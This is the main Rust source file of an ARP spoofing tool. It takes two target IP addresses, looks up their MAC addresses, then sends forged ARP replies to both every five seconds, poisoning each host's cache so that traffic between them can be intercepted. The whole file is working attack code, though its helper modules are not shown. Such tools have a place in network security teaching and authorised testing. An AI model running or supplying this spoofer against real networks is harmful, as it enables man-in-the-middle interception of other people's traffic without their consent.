mod net;
use net::*;
use std::env::args;
use std::{thread, time};

fn main() {
	if args().len() == 3 {
		let target_a_ip = args().nth(1).unwrap();
		let target_b_ip = args().nth(2).unwrap();

		if utils::is_valid(&target_a_ip) && utils::is_valid(&target_b_ip) {
			match utils::build_socket() {
				Ok(mut socket) => {
					let target_a_ip = utils::parse_ip(&target_a_ip);
					let target_b_ip = utils::parse_ip(&target_b_ip);

					arp::request::send(&mut socket, &target_a_ip);
					let target_a_mac = arp::request::capture(&mut socket, &target_a_ip);
					arp::request::send(&mut socket, &target_b_ip);
					let target_b_mac = arp::request::capture(&mut socket, &target_b_ip);
					println!(
						"\n{:?} : {:x?}\n{:?} : {:x?}\n",
						target_a_ip, target_a_mac, target_b_ip, target_b_mac
					);

					loop {
						arp::reply::send(&mut socket, &target_a_ip, &target_a_mac, &target_b_ip);
						arp::reply::send(&mut socket, &target_b_ip, &target_b_mac, &target_a_ip);

						thread::sleep(time::Duration::from_secs(5));
					}
				}
				Err(e) => eprintln!("{}", e),
			}
		} else {
			eprintln!("invalid IP address");
		}
	} else {
		eprintln!("usage : sudo ./arp-spoof <target_IP> <other_target_IP>");
	}
}
